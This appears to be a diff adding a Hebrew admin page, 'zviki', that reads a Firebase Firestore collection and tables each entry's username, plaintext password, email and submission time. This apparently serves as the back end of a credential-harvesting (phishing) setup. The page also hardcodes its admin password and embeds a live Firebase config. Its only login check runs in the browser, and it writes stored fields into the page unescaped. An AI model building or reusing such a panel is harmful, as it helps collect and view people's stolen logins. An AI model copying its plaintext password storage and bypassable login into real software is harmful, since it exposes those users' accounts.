@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel - zviki</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-box, .admin-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .admin-container { max-width: 950px; display: none; margin: 20px; }
+        input, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { background: #007bff; color: white; border: none; cursor: pointer; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: white; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: right; }
+        th { background: #333; color: white; }
+        .delete-btn { background: #dc3545; width: auto; padding: 5px 10px; font-size: 12px; }
+        .refresh-btn { background: #28a745; width: auto; margin-left: 10px; }
+    </style>
+</head>
+<body>
+
+<div id="loginBox" class="login-box">
+    <h2>כניסת אדמין</h2>
+    <input type="password" id="adminPass" placeholder="הזן סיסמת ניהול">
+    <button onclick="checkPass()">כניסה</button>
+    <p id="errorMsg" style="color: red; display: none;">סיסמה שגויה!</p>
+</div>
+
+<div id="adminContent" class="admin-container">
+    <h1>ניהול נתונים - zviki</h1>
+    <div style="display: flex; justify-content: space-between;">
+        <button class="refresh-btn" onclick="loadData()">רענן רשימה ↻</button>
+        <button style="background:#dc3545; width: auto;" onclick="deleteAllData()">מחק את כל הנתונים</button>
+    </div>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>שם משתמש</th>
+                <th>סיסמה</th>
+                <th>אימייל</th>
+                <th>זמן שליחה</th>
+                <th>פעולות</th>
+            </tr>
+        </thead>
+        <tbody id="resultsTable"></tbody>
+    </table>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getFirestore, collection, getDocs, deleteDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBa3zQBhqsTL7LchWLEZUV4ThZuBE20BdU",
+    authDomain: "zviki-4ccc3.firebaseapp.com",
+    projectId: "zviki-4ccc3",
+    storageBucket: "zviki-4ccc3.firebasestorage.app",
+    messagingSenderId: "863677370130",
+    appId: "1:863677370130:web:f2f8d9de13c7f91c1fedcb"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  const ADMIN_PASSWORD = "zviki09+"; 
+
+  window.checkPass = () => {
+    if (document.getElementById('adminPass').value === ADMIN_PASSWORD) {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('adminContent').style.display = 'block';
+        loadData();
+    } else {
+        document.getElementById('errorMsg').style.display = 'block';
+    }
+  };
+
+  async function loadData() {
+    const tableBody = document.getElementById('resultsTable');
+    tableBody.innerHTML = "טוען...";
+    try {
+      const q = query(collection(db, "zviki"), orderBy("timestamp", "desc"));
+      const querySnapshot = await getDocs(q);
+      tableBody.innerHTML = "";
+      querySnapshot.forEach((docSnap) => {
+        const data = docSnap.data();
+        tableBody.innerHTML += `
+          <tr>
+            <td>${data.name || ''}</td>
+            <td>${data.password || ''}</td>
+            <td>${data.email || ''}</td>
+            <td>${data.timestamp ? data.timestamp.toDate().toLocaleString('he-IL') : ''}</td>
+            <td><button class="delete-btn" onclick="deleteItem('${docSnap.id}')">מחק</button></td>
+          </tr>`;
+      });
+    } catch (e) { tableBody.innerHTML = "שגיאה בטעינה."; }
+  }
+
+  window.deleteItem = async (id) => {
+    if(confirm("למחוק שורה זו?")) { await deleteDoc(doc(db, "zviki", id)); loadData(); }
+  };
+
+  window.deleteAllData = async () => {
+    if(confirm("למחוק את כללל הנתונים לצמיתות?")) {
+        const snap = await getDocs(collection(db, "zviki"));
+        snap.forEach(async (d) => await deleteDoc(doc(db, "zviki", d.id)));
+        setTimeout(loadData, 1000);
+    }
+  };
+
+  window.loadData = loadData;
+</script>
+</body>
+</html>
